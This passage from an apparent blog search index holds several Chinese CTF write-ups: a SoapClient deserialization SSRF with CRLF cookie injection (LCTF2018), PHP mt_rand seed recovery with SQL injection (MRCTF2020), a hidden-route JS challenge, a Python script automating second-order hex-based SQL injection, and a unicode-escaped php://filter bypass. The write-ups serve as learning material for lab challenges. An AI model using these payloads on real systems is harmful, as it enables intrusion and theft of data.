<p>需要利用到soap进行ssrf</p>
<p>SoapClient对象中的方法进行SSRF请求，SoapClient类中有一个__call魔术方法，所以我们只需要找到一个能够调用SoapClient的不存在方法的地方即可</p>
<p>两个call_user_func给我们提供的方法</p>
<p>想到利用extract进行变量覆盖</p>
<p>将<code>call_user_func($b, $a);</code>构造成<code>call_user_func(call_user_func, $a);</code>的形式而a是一个数组，他的第一个变量可控，数组在call_user_func中</p>
<p>会将key作为类value作为方法</p>
<p>那么如果我们</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$a = array(reset($_SESSION[&#x27;SoapClient&#x27;]), &#x27;welcome_to_the_lctf2018&#x27;);</span><br><span class="line">call_user_func(call_user_func, $a);</span><br></pre></td></tr></table></figure>

<p>这样的话他就会调用SoapClient里面的welcome_to_the_lctf2018方法，因为没有这个方法所以直接进入__call魔术方法</p>
<p>而soap魔术方法是内置一个CRLF漏洞的</p>
<p>我们知道请求头与请求体的分割就是由两个\r\n来分割的，我们可以在里面添加一些恶意的换行来注入我们想要的cookie而如果这个cookie可控而且页面将里面的session内容打印出来了，flag的内容就存在这个session内容当中所以我们只需要利用ssrf访问内容然后设定其中的PHPSESSID成我们自己知道的，在index页面直接访问即可</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$target</span> = <span class="string">&#x27;http://127.0.0.1/flag.php&#x27;</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> SoapClient(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span>=&gt;<span class="variable">$target</span>,<span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="string">&quot;paixiaoxing\r\nCookie:PHPSESSID=123456\r\n&quot;</span>,<span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&#x27;http://127.0.0.1/&#x27;</span> ));</span><br><span class="line"><span class="variable">$b</span> = serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;|&quot;</span>.urlencode(<span class="variable">$b</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>step1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">get:?f=session_start&amp;name=|O%3A10%3A%22SoapClient%22%3A4%3A%7Bs%3A3%3A%22uri%22%3Bs%3A17%3A%22http%3A%2F%2F127.0.0.1%2F%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A11%3A%22_user_agent%22%3Bs%3A38%3A%22paixiaoxing%0D%0ACookie%3APHPSESSID%3D123456%0D%0A%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D</span><br><span class="line">post:serialize_handler=php_serialize</span><br></pre></td></tr></table></figure>

<p>step2:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">get:?f=extracr&amp;name=SoapClient</span><br><span class="line">post:b=call_user_func</span><br></pre></td></tr></table></figure>

<p>触发反序列化ssrf</p>
<p>step3:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET</span><br><span class="line">header:</span><br><span class="line">Cookie:PHPSESSID=123456</span><br></pre></td></tr></table></figure>

<p>即可查看到此session中的内容</p>
]]></content>
      <tags>
        <tag>LCTF2018</tag>
      </tags>
  </entry>
  <entry>
    <title>MRCTF2020-Ezaudit</title>
    <url>/2022/04/14/MRCTF2020-Ezaudit/</url>
    <content><![CDATA[<h2 id="MRCTF2020-Ezaudit"><a href="#MRCTF2020-Ezaudit" class="headerlink" title="[MRCTF2020]Ezaudit"></a>[MRCTF2020]Ezaudit</h2><p>打开是一个页面，但是题目的名字是简单审计</p>
<p>猜测有源码泄露</p>
<p>寻找一番，找到了访问<a class="link" href="http://www.zip发现index.php/">www.zip发现index.php<i class="fas fa-external-link-alt"></i></a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">header(<span class="string">&#x27;Content-type:text/html; charset=utf-8&#x27;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;login&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="variable">$Private_key</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;Private_key&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> ((<span class="variable">$username</span> == <span class="string">&#x27;&#x27;</span>) || (<span class="variable">$password</span> == <span class="string">&#x27;&#x27;</span>) ||(<span class="variable">$Private_key</span> == <span class="string">&#x27;&#x27;</span>)) &#123;</span><br><span class="line">        <span class="comment">// 若为空,视为未填写,提示错误,并3秒后返回登录界面</span></span><br><span class="line">        header(<span class="string">&#x27;refresh:2; url=login.html&#x27;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;用户名、密码、密钥不能为空啦,crispr会让你在2秒后跳转到登录界面的!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$Private_key</span> != <span class="string">&#x27;*************&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        header(<span class="string">&#x27;refresh:2; url=login.html&#x27;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;假密钥，咋会让你登录?crispr会让你在2秒后跳转到登录界面的!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$Private_key</span> === <span class="string">&#x27;************&#x27;</span>)&#123;</span><br><span class="line">        <span class="variable">$getuser</span> = <span class="string">&quot;SELECT flag FROM user WHERE username= &#x27;crispr&#x27; AND password = &#x27;<span class="subst">$password</span>&#x27;&quot;</span>.<span class="string">&#x27;;&#x27;</span>; </span><br><span class="line">        <span class="variable">$link</span>=mysql_connect(<span class="string">&quot;localhost&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;root&quot;</span>);</span><br><span class="line">        mysql_select_db(<span class="string">&quot;test&quot;</span>,<span class="variable">$link</span>);</span><br><span class="line">        <span class="variable">$result</span> = mysql_query(<span class="variable">$getuser</span>);</span><br><span class="line">        <span class="keyword">while</span>(<span class="variable">$row</span>=mysql_fetch_assoc(<span class="variable">$result</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;tr&gt;&lt;td&gt;&quot;</span>.<span class="variable">$row</span>[<span class="string">&quot;username&quot;</span>].<span class="string">&quot;&lt;/td&gt;&lt;td&gt;&quot;</span>.<span class="variable">$row</span>[<span class="string">&quot;flag&quot;</span>].<span class="string">&quot;&lt;/td&gt;&lt;td&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">// 公钥</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">public_key</span>(<span class="params"><span class="variable">$length</span> = <span class="number">16</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$strings1</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">    <span class="variable">$public_key</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ( <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$length</span>; <span class="variable">$i</span>++ )</span><br><span class="line">    <span class="variable">$public_key</span> .= substr(<span class="variable">$strings1</span>, mt_rand(<span class="number">0</span>, strlen(<span class="variable">$strings1</span>) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$public_key</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//私钥</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">private_key</span>(<span class="params"><span class="variable">$length</span> = <span class="number">12</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$strings2</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">    <span class="variable">$private_key</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ( <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$length</span>; <span class="variable">$i</span>++ )</span><br><span class="line">    <span class="variable">$private_key</span> .= substr(<span class="variable">$strings2</span>, mt_rand(<span class="number">0</span>, strlen(<span class="variable">$strings2</span>) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$private_key</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable">$Public_key</span> = public_key();</span><br><span class="line">  <span class="comment">//$Public_key = KVQP0LdJKRaV3n9D  how to get crispr&#x27;s private_key???</span></span><br></pre></td></tr></table></figure>

<p>给出了公钥，需要求出私钥，猜测题目意思应该是他们的种子是一样的，我们需要根据这个公钥求出种子，然后让这个种子生成私钥，将私钥传入登录即可</p>
<p>回到上面的登录页面发现，当我们的私钥正确之后会进入一个查询语句，只需要我们的密码正确即可，但是对这个password没有任何的过滤，所以我们可以直接万能密码绕过即可</p>
<p>先根据这个公钥恢复成<code>php_mt_seed</code>能够识别的数据：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">str1 = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span></span><br><span class="line">str2 = <span class="string">&#x27;KVQP0LdJKRaV3n9D&#x27;</span></span><br><span class="line">str3 = str1[::-<span class="number">1</span>]</span><br><span class="line">length = <span class="built_in">len</span>(str2)</span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(str2)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(str1)):</span><br><span class="line">        <span class="keyword">if</span> str2[i] == str1[j]:</span><br><span class="line">            res += <span class="built_in">str</span>(j) + <span class="string">&#x27; &#x27;</span> + <span class="built_in">str</span>(j) + <span class="string">&#x27; &#x27;</span> + <span class="string">&#x27;0&#x27;</span> + <span class="string">&#x27; &#x27;</span> + <span class="built_in">str</span>(<span class="built_in">len</span>(str1) - <span class="number">1</span>) + <span class="string">&#x27; &#x27;</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure>

<p>然后丢到<code>php_mt_seed</code>脚本里面去跑就行了</p>
<p>最后结果应该是</p>
<p>1775196155</p>
<p>然后生成私钥即可</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">mt_srand(<span class="number">1775196155</span>);</span><br><span class="line"><span class="comment">//公钥</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">public_key</span>(<span class="params"><span class="variable">$length</span> = <span class="number">16</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$strings1</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">    <span class="variable">$public_key</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ( <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$length</span>; <span class="variable">$i</span>++ )</span><br><span class="line">    <span class="variable">$public_key</span> .= substr(<span class="variable">$strings1</span>, mt_rand(<span class="number">0</span>, strlen(<span class="variable">$strings1</span>) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$public_key</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//私钥</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">private_key</span>(<span class="params"><span class="variable">$length</span> = <span class="number">12</span></span>) </span>&#123;</span><br><span class="line">  </span><br><span class="line">  <span class="variable">$strings2</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">  <span class="variable">$private_key</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="keyword">for</span> ( <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$length</span>; <span class="variable">$i</span>++ )</span><br><span class="line">  <span class="variable">$private_key</span> .= substr(<span class="variable">$strings2</span>, mt_rand(<span class="number">0</span>, strlen(<span class="variable">$strings2</span>) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="variable">$private_key</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> public_key().<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> private_key().<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>登录拿flag</p>
]]></content>
      <tags>
        <tag>MRCTF2020</tag>
      </tags>
  </entry>
  <entry>
    <title>Welcome-to-Earth</title>
    <url>/2022/04/08/Welcome-to-Earth/</url>
    <content><![CDATA[<h2 id="b01lers2020-Welcome-to-Earth"><a href="#b01lers2020-Welcome-to-Earth" class="headerlink" title="[b01lers2020]Welcome to Earth"></a>[b01lers2020]Welcome to Earth</h2><p>进入页面之后过几秒种会跳转到die页面</p>
<p>在这几秒内查看一下网页源码（也可以抓包直接看不会变）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">document.onkeydown = function(event) &#123;</span><br><span class="line">  event = event || window.event;</span><br><span class="line">  if (event.keyCode == 27) &#123;</span><br><span class="line">    event.preventDefault();</span><br><span class="line">    window.location = &quot;/chase/&quot;;</span><br><span class="line">  &#125; else die();</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">function sleep(ms) &#123;</span><br><span class="line">  return new Promise(resolve =&gt; setTimeout(resolve, ms));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">async function dietimer() &#123;</span><br><span class="line">  await sleep(10000);</span><br><span class="line">  die();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function die() &#123;</span><br><span class="line">  window.location = &quot;/die/&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发现还隐藏一个页面/chase/写在前端直接进就行</p>
<p>又发现隐藏一个leftt页面</p>
<p>shoot</p>
<p>door</p>
<p>door页面的话有点不同，他的页面上的所有点都是没用的，你点击submit之后会直接跳转到die</p>
<p>但是页面给出了js，减去发现open路由</p>
<p>同样的操作进入fight</p>
<p>到了这里的js就可以看到flag了，其实一眼也就看出来了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pctf&#123;hey_boys_im_baaaaaaaaaack!&#125;</span><br></pre></td></tr></table></figure>



]]></content>
      <tags>
        <tag>b01lers2020</tag>
      </tags>
  </entry>
  <entry>
    <title>网鼎杯-Unfinish</title>
    <url>/2022/04/12/%E7%BD%91%E9%BC%8E%E6%9D%AF-Unfinish/</url>
    <content><![CDATA[<h2 id="网鼎杯2018-Unfinish"><a href="#网鼎杯2018-Unfinish" class="headerlink" title="[网鼎杯2018]Unfinish"></a>[网鼎杯2018]Unfinish</h2><p>磨磨唧唧写了半天脚本总算是完成了</p>
<p>有个登录页面，猜测有一个注册页面</p>
<p>进去注册登录，进去之后发现啥也按不了，所有页面只有一个注册时用户名的信息猜测有sql注入注入点在username</p>
<p>测试发现过滤了<code>,以及information</code></p>
<p>而且一般这种注册之后放到index页面的语句应该是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">insert table values (&#x27;email&#x27;,&#x27;username&#x27;,password)</span><br></pre></td></tr></table></figure>

<p>既然注入点在username，而在sql中如果可以运用hex将字符串转换成16进制读出来，而进行两次hex之后就不会出现字母可以利用这一点然后来读取index页面的username去两次hex解析就能拿到我们想要的信息因为回显是数字形式，所以可以构造username为<code>0&#39;+构造语句+&#39;0</code></p>
<p>这点sql跟php类似，会我们将前面构造成0后面构造成0他就会转换成数字再相加，最后得到我们想要的hex编码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0&#x27;+( hex(hex((select database() ))))+&#x27;0</span><br></pre></td></tr></table></figure>

<p>这样注册之后发现，这里有长度限制，只能回显10个数字需要加上substr但是逗号被ban了，可以用from for 替换</p>
<p>最终payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">from lxml import etree</span><br><span class="line">import re</span><br><span class="line">from time import sleep</span><br><span class="line"></span><br><span class="line">def reg(url,email,payload,password):</span><br><span class="line">	urlr = url + &#x27;register.php&#x27;</span><br><span class="line">	data = &#123;</span><br><span class="line">		&#x27;email&#x27;:email,</span><br><span class="line">		&#x27;username&#x27;:payload,</span><br><span class="line">		&#x27;password&#x27;:password</span><br><span class="line">	&#125;</span><br><span class="line">	requests.post(urlr,data)</span><br><span class="line"></span><br><span class="line">def log(url,email,password):</span><br><span class="line">	urlr = url + &#x27;login.php&#x27;</span><br><span class="line">	data = &#123;</span><br><span class="line">		&#x27;email&#x27;:email,</span><br><span class="line">		&#x27;password&#x27;:password</span><br><span class="line">	&#125;</span><br><span class="line">	session.post(urlr,data)</span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line">result = &#x27;&#x27;</span><br><span class="line">for i in range(1,100):</span><br><span class="line">	url = &#x27;http://7cd63c31-816e-4788-8cf8-f44be499bcc7.node4.buuoj.cn:81/&#x27;</span><br><span class="line">	email = str(i) + &#x27;11123133356@1234.com&#x27;</span><br><span class="line">	payload = &quot;0&#x27;+( substr(hex(hex((select * from flag ))) from &#123;&#125; for 10))+&#x27;0&quot;.format((i-1)*10+1)</span><br><span class="line">	password = &#x27;admin&#x27;</span><br><span class="line">	reg(url,email,payload,password)</span><br><span class="line">	log(url,email,password)</span><br><span class="line">	urli = url + &#x27;index.php&#x27;</span><br><span class="line">	io = session.get(url)</span><br><span class="line">	#io.encoding=&quot;utf-8&quot;</span><br><span class="line">	#print(io.text)</span><br><span class="line">	html = etree.HTML(io.text)</span><br><span class="line">	a = html.xpath(&#x27;//span[@class=&quot;user-name&quot;]/text()&#x27;)</span><br><span class="line">	#print(type(a))</span><br><span class="line">	if(a[0] == &#x27;\n            0          &#x27;):</span><br><span class="line">		break</span><br><span class="line">	else:</span><br><span class="line">		m = re.search(&quot;3.* &quot;, str(a)).group(0)[:10]</span><br><span class="line">		#print(m)</span><br><span class="line">		result += m</span><br><span class="line">		sleep(0.4)</span><br><span class="line"></span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure>

<p>然后拿去解码一下就行了。</p>
]]></content>
      <tags>
        <tag>网鼎杯2018</tag>
      </tags>
  </entry>
  <entry>
    <title>encode-and-encode</title>
    <url>/2022/04/09/encode-and-encode/</url>
    <content><![CDATA[<h2 id="HarekazeCTF2019-encode-and-encode"><a href="#HarekazeCTF2019-encode-and-encode" class="headerlink" title="[HarekazeCTF2019]encode_and_encode"></a>[HarekazeCTF2019]encode_and_encode</h2><p>进入题目不难找到源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">  show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params"><span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">  <span class="variable">$banword</span> = [</span><br><span class="line">    <span class="comment">// no path traversal</span></span><br><span class="line">    <span class="string">&#x27;\.\.&#x27;</span>,</span><br><span class="line">    <span class="comment">// no stream wrapper</span></span><br><span class="line">    <span class="string">&#x27;(php|file|glob|data|tp|zip|zlib|phar):&#x27;</span>,</span><br><span class="line">    <span class="comment">// no data exfiltration</span></span><br><span class="line">    <span class="string">&#x27;flag&#x27;</span></span><br><span class="line">  ];</span><br><span class="line">  <span class="variable">$regexp</span> = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$banword</span>) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">  <span class="keyword">if</span> (preg_match(<span class="variable">$regexp</span>, <span class="variable">$str</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$body</span> = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="variable">$json</span> = json_decode(<span class="variable">$body</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (is_valid(<span class="variable">$body</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$json</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$json</span>[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$page</span> = <span class="variable">$json</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">  <span class="variable">$content</span> = file_get_contents(<span class="variable">$page</span>);</span><br><span class="line">  <span class="keyword">if</span> (!<span class="variable">$content</span> || !is_valid(<span class="variable">$content</span>)) &#123;</span><br><span class="line">    <span class="variable">$content</span> = <span class="string">&quot;&lt;p&gt;not found&lt;/p&gt;\n&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="variable">$content</span> = <span class="string">&#x27;&lt;p&gt;invalid request&lt;/p&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// no data exfiltration!!!</span></span><br><span class="line"><span class="variable">$content</span> = preg_replace(<span class="string">&#x27;/HarekazeCTF\&#123;.+\&#125;/i&#x27;</span>, <span class="string">&#x27;HarekazeCTF&#123;&amp;lt;censored&amp;gt;&#125;&#x27;</span>, <span class="variable">$content</span>);</span><br><span class="line"><span class="keyword">echo</span> json_encode([<span class="string">&#x27;content&#x27;</span> =&gt; <span class="variable">$content</span>]);</span><br></pre></td></tr></table></figure>

<p>通读一下源码发现：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$body</span> = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="variable">$json</span> = json_decode(<span class="variable">$body</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (is_valid(<span class="variable">$body</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$json</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$json</span>[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$page</span> = <span class="variable">$json</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">  <span class="variable">$content</span> = file_get_contents(<span class="variable">$page</span>);</span><br><span class="line">  <span class="keyword">if</span> (!<span class="variable">$content</span> || !is_valid(<span class="variable">$content</span>)) &#123;</span><br><span class="line">    <span class="variable">$content</span> = <span class="string">&quot;&lt;p&gt;not found&lt;/p&gt;\n&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="variable">$content</span> = <span class="string">&#x27;&lt;p&gt;invalid request&lt;/p&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>她会将我们post传入的参数进行一次json的解码，然后进行判断body是否有效，需要里面含有key:page</p>
<p>然后获取page的value进行file_get_contents</p>
<p>我们可以传入一个json键值对，然后输入一个文件即可，但是这个内容需要经过上面的过滤，也就是说不能有协议、目录以及flag</p>
<p>如果查到content里面有相关的ctf内容，替换成content</p>
<p>可以用unicode编码一下，在json编码的时候会支持unicode编码，所以直接对我们输入的内容进行编码然后当作page的value就行</p>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;page&quot;:&quot;php://filter/convert.banse64-encode/resource=/flag&quot;&#125;</span><br><span class="line">&#123;&quot;page&quot;:&quot;\u0070\u0068\u0070\u003A\u002F\u002F\u0066\u0069\u006C\u0074\u0065\u0072\u002F\u0063\u006F\u006E\u0076\u0065\u0072\u0074\u002E\u0062\u0061\u0073\u0065\u0036\u0034\u002D\u0065\u006E\u0063\u006F\u0064\u0065\u002F\u0072\u0065\u0073\u006F\u0075\u0072\u0063\u0065\u003D\u002F\u0066\u006C\u0061\u0067&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>直接拿到flag</p>
<p><img src="/2022/04/09/encode-and-encode/1.png" alt="1"></p>
<p>解码即可</p>
]]></content>
      <tags>
        <tag>HarekazeCTF2019</tag>
      </tags>
  </entry>
</search>
